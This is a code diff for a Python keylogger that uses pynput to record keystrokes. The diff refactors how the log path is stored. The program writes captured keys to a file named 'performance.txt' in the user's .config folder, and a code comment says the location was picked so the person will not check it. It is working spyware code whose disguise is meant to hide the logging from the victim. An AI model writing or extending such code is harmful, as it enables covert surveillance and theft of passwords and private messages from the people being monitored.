@@ -3,7 +3,9 @@ import sys;
 from typing import *;
 from pynput.keyboard import Listener, Key;
 
+EXISTS: bool = False;
 HOMEPATH: str = ""
+FILEPATH: str = ""
 KEYS: List[Key] = []
 COUNT: int = 0
 
@@ -31,19 +33,23 @@ def writeKey(keys: List[Key]) -> None:
     person will not check in
     """
     global HOMEPATH
+    global FILEPATH
+    global EXISTS
     if os.name == "posix": # We are on a Linux or Mac sytem
         HOMEPATH = "/home/"
         try:
             username = os.getlogin() + "/" # We will try to get their username
-            path: str = searchFile(HOMEPATH + username, ".config") # We will look for .config folder
-            if (path is None): # .config was not found then we will make one
+            if EXISTS is False:
+                FILEPATH = searchFile(HOMEPATH + username, ".config") # We will look for .config folder
+                EXISTS = True  # Even if the file does not necessarily exist than we make it true because we will create it
+            if (FILEPATH is None): # .config was not found then we will make one
                 try:
                     os.makedirs(HOMEPATH + username + ".config")
-                    path = HOMEPATH + username + ".config"
+                    FILEPATH = HOMEPATH + username + ".config"
                 except OSError as e:
                     print(f"Failed to create folder: {e}")
                     sys.exit(1)
-            with open(path + "/performance.txt", "a") as keyFile:
+            with open(FILEPATH + "/performance.txt", "a") as keyFile:
                 for key in keys:
                     k = str(key).replace("'", "") # Replace quotes that come with keys
                     if k.find("space") > 0:
